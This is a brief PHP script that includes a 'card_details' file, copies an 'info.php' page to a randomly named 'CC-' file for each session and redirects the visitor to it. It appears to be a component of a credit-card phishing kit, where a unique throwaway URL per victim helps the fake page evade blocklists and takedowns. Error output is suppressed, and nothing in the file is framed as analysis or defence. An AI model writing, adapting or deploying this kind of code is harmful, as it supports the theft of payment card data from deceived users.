<?php
error_reporting(0);
session_start();
include('../lang/language.php');
include('../card_details.php');
if (empty($_SESSION['dst']) == true) {
$dst = substr(str_shuffle("ABC8DEFGH2IJKL3MN956OPQRSTUV4WXY7Z1"), -13);
$_SESSION['dst'] = $dst;
} 
$dst = $_SESSION['dst'];
copy("info.php",'CC-'.$dst.'.php');
header('Location:./CC-'.$dst.''); 
?>
